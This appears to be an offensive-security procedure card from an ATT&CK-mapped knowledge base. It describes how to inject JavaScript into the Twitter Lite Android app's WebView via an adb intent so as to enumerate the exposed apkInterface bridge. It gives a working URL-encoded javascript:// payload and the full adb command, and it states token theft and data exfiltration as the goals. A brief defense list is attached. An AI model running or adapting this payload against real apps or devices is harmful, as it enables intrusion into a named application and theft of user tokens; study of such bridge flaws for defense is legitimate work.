---
tags:
  - android
  - javascript-injection
  - discovery
type: procedure
tools:
  - '[[tools/ADB-Android-Debug-Bridge]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/adb-enumerate-apkinterface-properties-in-twitterlite]]'
verified: false
platforms:
  - Android
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:24:34.616Z'
sub_techniques: []
id: d1a5d63d-dae9-446f-bae2-b08f7bab5102
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Enumerate apkInterface Properties via JavaScript Injection in TwitterLiteActivity

## Summary

This procedure enumerates properties and methods of the exposed apkInterface object in the Twitter Lite WebView using injected JavaScript, identifying callable functions like getApkPushParams for token theft.

## Description

Building on window enumeration, target window.apkInterface with a similar Object.getOwnPropertyNames loop. This reveals app backend methods bridged via addJavascriptInterface, allowing JS to invoke native code.

## Requirements

1. Prior discovery of apkInterface
2. ADB and encoded JS

## Defense

Defensive measures and detection strategies:

- Avoid exposing sensitive interfaces or use validation on method calls
- Set WebView settings to limit JS bridge access
- Audit for unintended property exposure

## Objectives

1. List exploitable methods on apkInterface
2. Prepare for data exfiltration
3. Highlight JS-native bridge risks

## Instructions

### Step 1: Prepare Payload for apkInterface

**Context**: JS to list apkInterface properties.

Payload: javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window.apkInterface).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B

### Step 2: Inject and Enumerate

**Context**: Launch with the targeted payload.

**Command** ([[commands/adb-enumerate-apkinterface-properties-in-twitterlite]]):
```bash
adb shell am start -a "android.intent.action.VIEW" -n com.twitter.android.lite/com.twitter.android.lite.TwitterLiteActivity -d "javascript://google.com%0Ajavascript:Object.getOwnPropertyNames(window.apkInterface).forEach(function(v%2C%20x)%20%7B%20document.writeln(v)%3B%20%7D)%3B"
```

> Outputs properties to document.

**Expected Output**: Methods like getApkPushParams listed.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used

- [[commands/adb-enumerate-apkinterface-properties-in-twitterlite]]

## Tools Used

- [[tools/ADB-Android-Debug-Bridge]]

## Tags

- android
- javascript-injection
- discovery
- webview
